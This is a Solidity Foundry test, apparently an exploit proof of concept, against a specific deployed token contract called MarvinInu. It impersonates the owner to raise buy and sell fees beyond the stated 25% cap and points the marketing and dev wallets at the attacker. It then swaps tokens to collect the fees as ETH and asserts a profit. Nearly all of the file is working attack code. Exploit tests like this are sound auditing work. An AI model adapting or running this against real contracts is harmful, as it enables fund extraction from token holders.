contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x55a380d134d722006A5CE2d510562e1239D225B1;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use vm.prank to impersonate owner
        // The test file already defines TARGET and attacker
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Store initial ETH balance
        uint256 initialBalance = address(this).balance;

        // Get the owner address from the contract
        MarvinInu target = MarvinInu(TARGET);
        address owner = target.owner();

        // Impersonate the owner
        vm.startPrank(owner);

        // Enable trading if not already enabled (call won't fail if already enabled)
        target.enableTrading();

        // Set buy fees to 26% (exceeds 25% limit)
        target.updateBuyFees(10, 10, 6); // 10 + 10 + 6 = 26%

        // Set sell fees to 26%
        target.updateSellFees(10, 10, 6); // 10 + 10 + 6 = 26%

        // Update marketing and dev wallets to attacker address
        target.updateMarketingWallet(attacker);
        target.updateDevWallet(attacker);

        vm.stopPrank();

        // Get some MARVIN tokens as required by precondition
        deal(TARGET, attacker, 1000 * 10**18);

        // Approve router to spend our tokens
        IERC20(TARGET).approve(address(target.uniswapV2Router()), type(uint256).max);

        // Perform a swap to trigger fee collection
        // We'll swap a small amount to avoid hitting max transaction limits
        uint256 amountToSwap = 100 * 10**18;

        // Get router address from the contract
        address routerAddress = address(target.uniswapV2Router());
        IUniswapV2Router02 router = IUniswapV2Router02(routerAddress);

        // Create path for swap: MARVIN -> WETH
        address[] memory path = new address[](2);
        path[0] = TARGET;
        path[1] = router.WETH();

        // Perform the swap
        vm.prank(attacker);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0, // accept any amount of ETH
            path,
            attacker,
            block.timestamp
        );

        // Check that our ETH balance increased
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

